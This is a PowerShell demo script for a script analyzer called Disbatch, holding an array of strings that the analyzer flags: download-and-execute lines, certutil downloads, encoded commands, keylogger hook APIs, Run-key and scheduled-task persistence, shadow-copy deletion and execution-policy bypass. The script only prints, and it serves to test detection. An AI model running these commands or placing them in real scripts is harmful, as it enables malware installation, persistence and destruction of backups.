<#
    Disbatch ANALYZER demo  (safe to open and run)

    Every "risky" line below lives inside a string array, so this script does
    nothing harmful -- but Disbatch's analyzer still flags the patterns. Open it
    in Disbatch and click a finding on the right to jump to its line in the
    preview. Because there are danger-level findings, Run stays disabled until
    you tick "I understand the risks, run anyway".
#>
param(
    [Parameter(Mandatory = $true)]
    [string]$TargetFolder,

    [ValidateSet("Scan", "Report")]
    [string]$Mode = "Scan",

    [switch]$VerboseOutput
)

Write-Host "Safe demo - this script only prints. Nothing below is executed."

# These are just strings. The analyzer scans text line-by-line, so it flags
# each pattern even though none of it runs.
$flaggedExamples = @(
    'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://x")',
    'Invoke-WebRequest http://example.com/p.exe -OutFile p.exe',
    'certutil -urlcache -f http://example.com/p.exe p.exe',
    'powershell -EncodedCommand SQBFAFgA',
    'Add-Type SetWindowsHookEx WH_KEYBOARD_LL GetAsyncKeyState',
    'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v X /d evil.exe',
    'schtasks /create /tn X /tr evil.exe /sc onlogon',
    'vssadmin delete shadows /all /quiet',
    'Set-ExecutionPolicy Bypass -Scope Process'
)

Write-Host "@status Demo complete"
Write-Host ("Mode = {0}, Target = {1}, examples = {2}" -f $Mode, $TargetFolder, $flaggedExamples.Count)
